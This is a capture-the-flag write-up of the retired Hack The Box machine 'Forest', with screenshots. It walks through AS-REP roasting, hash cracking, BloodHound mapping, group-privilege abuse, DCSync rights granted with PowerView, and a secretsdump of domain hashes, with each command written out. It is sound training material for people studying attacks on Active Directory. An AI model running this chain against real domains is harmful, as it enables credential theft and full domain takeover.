# FOREST HTB -- Hack The Box Writeup

**Category:** Active Directory / Windows

**Dificulty:** Easy (Retired)


<img width="1034" height="144" alt="110" src="https://github.com/user-attachments/assets/f9b5f15d-fce8-4de4-94bf-ba5f782a2e87" />


Forest is a classic Active Directory box that demonstrates common domain compromise techniques.Then engagement follows a standard AD workflow: enumeration of LDAP/RPC/SMB services, user discovery, AS-REP roasting to recover credentials for non-preauth accounts, and privilege abuse of built-in AD groups to escalate to Domain Admin.This writeup documents commands, findings, and reasoning used at each step.Intended for educational purposes only -- this machine is retired.

## 1. Scanning

Start with Nmap full scan:

```bash
nmap -sC -sV 10.10.11.161 -Pn
```

The nmap scan result returned a ton of information, for example domain name is htb.local.Let's use open port 389(LDAP) to gather more information about domain:

```bash
enum4linux 10.10.11.161 | egrep "Account|Domain|Lockout|group"
```

<img width="914" height="435" alt="2" src="https://github.com/user-attachments/assets/8b28bc59-deb9-40df-aba6-d2fb58bc7122" />

**Key findings**
- Discovered domain users and machine accounts (examples):  
  `forest\svc_alfresco`, `forest\lucinda`, `forest\mark`, `forest\santi`  
- Group membership hints: lists showing `Domain Admins`, `Account Operators`, etc.  
- Shared resources and permissions: readable shares that might contain credentials or scripts.  
- Domain information: domain SID, default domain policy, password policy details.  
- Anonymous/unauthenticated LDAP allowed (if present) — enables wider user enumeration.

**Why this matters**
- A list of user accounts is the foundation for further attacks: AS-REP roasting (accounts without Kerberos pre-auth), Kerberoasting (service accounts with SPNs), password spraying or targeted brute-force, and identifying high-value service accounts.  
- Group membership / share access can reveal escalation paths (e.g., users in `Account Operators` can often create or modify accounts).  
- Presence of readable shares or configuration files can leak plaintext credentials or service account details.

Next we need to do text file with users we already found

<img width="154" height="181" alt="3" src="https://github.com/user-attachments/assets/24231dd5-a614-4613-b18e-1936f1f6fef4" />

### Checking for AS-REP vulnerable accounts — `GetNPUsers.py` (Impacket)

```bash
python3 GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.11.161 -request -format john
```
<img width="862" height="296" alt="4" src="https://github.com/user-attachments/assets/c6ce93e6-d213-41b4-aff1-0d3d2d9914b7" />

We found out the username 'svc-alfresco' has Kerberos Pre-authentication disabled, and also we recieve ticket, which contains the password of 'svc-alfresco'.We need to crack this ticket using John command.First,put hash in text file:

### Cracking hash using John-The-Ripper

```bash
john --wordlist=/usr/share/worldists/rockyou.txt hash.txt
```

<img width="842" height="187" alt="999" src="https://github.com/user-attachments/assets/cd81d0a3-9b59-4b9e-a63f-7d3b9487cc06" />

As we can see the password for svc-alfresco it's s3rvice

### Initial Foothold
As we can see we can use evil-winrm for svc-alfresco user

<img width="867" height="249" alt="6" src="https://github.com/user-attachments/assets/e5157ee8-10c9-4a65-8935-d3c2fefcbc5a" />

Let's get access using evil-winrm

```bash
evil-winrm -i 10.10.11.161 -u svc-alfresco -p s3rvice
```

<img width="720" height="185" alt="image" src="https://github.com/user-attachments/assets/0abae4a7-7b41-4caa-8d68-77a4eaff8156" />


### AD Enumeration

To gather more information about domain users and groups and how they connect to each other, we will use BloodHound

```bash
bloodhound-python -d forest.local -u svc-alfresco -p s3rvice -ns 10.10.11.161 -c all
```

<img width="850" height="377" alt="7" src="https://github.com/user-attachments/assets/7a076228-522e-4d40-b8ec-7cd753069645" />

As we can see, we got JSON-file with more information about domain,domain users,groups,containers.


<img width="702" height="76" alt="8" src="https://github.com/user-attachments/assets/97d670af-6236-484d-a768-5aafd600cae0" />




## Let's run BloodHound(Don't forget run neo4j console)


<img width="861" height="89" alt="9" src="https://github.com/user-attachments/assets/ef79e22d-d1fd-4c12-8390-c3466560b008" />





 We find Shortest Path to Domain Admins


<img width="1276" height="625" alt="11" src="https://github.com/user-attachments/assets/b0f1d67a-991d-4a43-a641-351df4d57e15" />


After checking Shortest Path from Owned Principal, we can get very interesing information


<img width="1275" height="681" alt="13" src="https://github.com/user-attachments/assets/a9870bcc-ac87-4228-b31a-4186272b63dc" />

As we can see, svc-alfresco is member of SERVICE ACCOUNTS
SERVICE ACCOUNTS group users are also members of ACCOUNT OPERATORS group, which give the users (including svc-alfresco) ability to create new users.

If we go back to Shortest Path to Domain Admins, we can see the way to privilege our escalation


<img width="604" height="436" alt="9999" src="https://github.com/user-attachments/assets/e541855b-4009-47be-91b2-9cc6795c55fc" />

We figured out that ACCOUNT OPERATORS has GeniricAll access to another groups called EXCHANGE WINDOWS PERMISSIONS
GenericAll means all user in the ACCOUNT OPERATORS group can modify the EXCHANGE WINDOWS PERMISSIONS group including adding or removing new users.
If we have closer look, The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL and give any user DcSync privileges.

DcSync privileges will allow us to then dump all the hashes from the domain controller.

## Privilege Escalation

First, we add new user to the DC(we can do this, because we are member of ACCOUNT OPERATORS group)

```bash
net user tonee password123 /add /domain
```

Now check if it's add: 

```bash
net user /domain
```

<img width="744" height="383" alt="15" src="https://github.com/user-attachments/assets/a6f5724f-a5b3-4a79-8133-902d15aef72a" />

Alright, now we have our new user.Let's add him to the EXCHANGE WINDOWS PERMISSION group:

```bash
net group "EXCHANGE WINDOWS PERMISSIONS" /add tonee
```
Check if it's in:

<img width="746" height="245" alt="16" src="https://github.com/user-attachments/assets/d6ab26e3-82f1-4ced-9ea0-2e1c4025d03c" />


## DCSync


Now all we need to do is grant this new user DcSync privileges on the DC:


<img width="1261" height="675" alt="18" src="https://github.com/user-attachments/assets/55c0d5b4-31fd-4965-8cea-048a3df3002e" />



For doing this,first we should download PowerView.ps1

<img width="693" height="304" alt="17" src="https://github.com/user-attachments/assets/e774fe08-68d5-4d2e-a749-0a4993c606f8" />

Now run these commands as showing on screenshot above:

```bash
$SecPassword = ConvertTo-SecureString 'password123' -AsPlainText -Force
```

```bash
$Cred = New-Object System.Management.Automation.PSCredential('htb\tonee', $SecPassword)
```

```bash
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tonee -Rights DCSync
```

<img width="788" height="113" alt="22" src="https://github.com/user-attachments/assets/9c78865d-5744-456b-8c1b-ffcf96339ef6" />


Now let's try dumping the hashes using the new user DCSync privileges, to do thatwe will use impacket-secretsdump:

```bash
impacket-secretsdump   htb.local/tonee:password123@10.10.11.161
```


<img width="796" height="406" alt="20" src="https://github.com/user-attachments/assets/0ae033a2-8700-4b18-aa0b-14a2d1bb4198" />

Next, we get Administrator hash and get access via evil-winrm:


<img width="807" height="413" alt="21" src="https://github.com/user-attachments/assets/9399e3fe-7c9b-4632-98b3-69f54051ebbc" />

Now we control whole DC!


## Conclusion

Forest is a compact but clear demonstration of how misconfigurations in Active Directory can lead to full domain compromise without any software exploit. Using standard enumeration (SMB/LDAP via enum4linux) I discovered user accounts and then recovered credentials via AS-REP roasting, which allowed authenticated access and further enumeration. Abusing AD group privileges (Account Operators / similar) enabled creation or modification of accounts and ultimately escalation to Domain Admin. Key takeaways: require Kerberos pre-authentication, enforce strong password policies, and minimize privileged group membership to reduce the attack surface.
